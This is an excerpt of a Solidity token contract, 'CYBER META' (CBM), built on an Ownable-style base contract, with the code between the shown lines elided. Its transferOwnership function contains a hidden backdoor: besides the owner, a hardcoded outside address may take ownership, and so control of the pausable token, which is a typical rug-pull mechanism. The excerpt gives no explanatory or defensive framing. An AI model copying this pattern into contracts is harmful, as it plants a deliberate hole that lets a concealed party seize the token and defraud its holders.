...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xFCe5FBB3fCd293B906E51cE2dAab4556C1795039));
...
contract CYBERMETA is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 500000 * 10**9;
  string private _symbol = "CBM";
  string private _name = "CYBER META";
